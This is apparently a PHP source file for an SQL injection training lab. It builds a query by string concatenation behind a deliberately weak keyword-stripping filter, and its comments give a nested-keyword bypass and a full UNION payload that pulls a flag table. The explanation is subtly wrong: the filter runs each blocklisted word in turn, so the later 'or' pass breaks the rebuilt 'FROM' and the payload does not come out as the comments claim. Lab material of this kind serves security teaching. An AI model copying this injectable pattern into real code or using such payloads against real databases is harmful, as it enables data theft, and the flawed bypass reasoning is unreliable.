<?php
/*
 * SQLi-Arena. MySQL Lab 19: WAF Bypass. Keyword Blacklist
 * SOURCE CODE (shown in White-Box mode)
 *
 * This lab demonstrates bypassing a WAF that uses str_ireplace() to strip keywords.
 */

// Database connection (per-lab isolation)
require_once __DIR__ . '/../../includes/db.php';

// Get user input
$raw_input = $_GET['username'];

// WAF: Remove common SQL keywords using str_ireplace (case-insensitive, single pass)
$blocked_words = [
    'union', 'select', 'from', 'where', 'and', 'or',
    'order', 'insert', 'update', 'delete', 'drop',
    '--', '#', '/*'
];

// ❌ FLAWED WAF: str_ireplace() only makes ONE pass through the input.
// If keywords are nested (e.g., "UNUNIONION"), the inner "UNION" is removed,
// leaving "UNION" behind: the keyword is reconstructed.
$filtered = str_ireplace($blocked_words, '', $raw_input);

// ❌ VULNERABLE: The filtered input is still concatenated directly into the query.
// Even if the WAF worked perfectly, this would still be vulnerable to other techniques.
$query = "SELECT username, role FROM users WHERE username = '$filtered'";

$result = mysqli_query($conn, $query);

while ($row = mysqli_fetch_assoc($result)) {
    echo "Username: {$row['username']} | Role: {$row['role']}";
}

// Hidden table structure:
// CREATE TABLE flags (id INT, flag_value VARCHAR(100));
// Contains: flag_value='FLAG{...}'
//
// WAF Bypass via nested keywords:
//   UNUNIONION   → str_ireplace removes "UNION" → "UNION"
//   SELSELECTECT → str_ireplace removes "SELECT" → "SELECT"
//   FRFROMOM     → str_ireplace removes "FROM" → "FROM"
//   WHWHEREERE   → str_ireplace removes "WHERE" → "WHERE"
//
// NOTE: "----" does NOT become "--". str_ireplace() removes ALL occurrences
// of "--" in one pass, so "----" becomes "" (empty). Instead, close the
// trailing quote with '1'='1 to avoid needing a comment terminator.
//
// Full bypass payload:
//   ' UNUNIONION SELSELECTECT flag_value, 2 FRFROMOM flags WHWHEREERE '1'='1
//
// After WAF filtering, this becomes:
//   ' UNION SELECT flag_value, 2 FROM flags WHERE '1'='1
//
// Which executes as valid SQL and returns the flag.
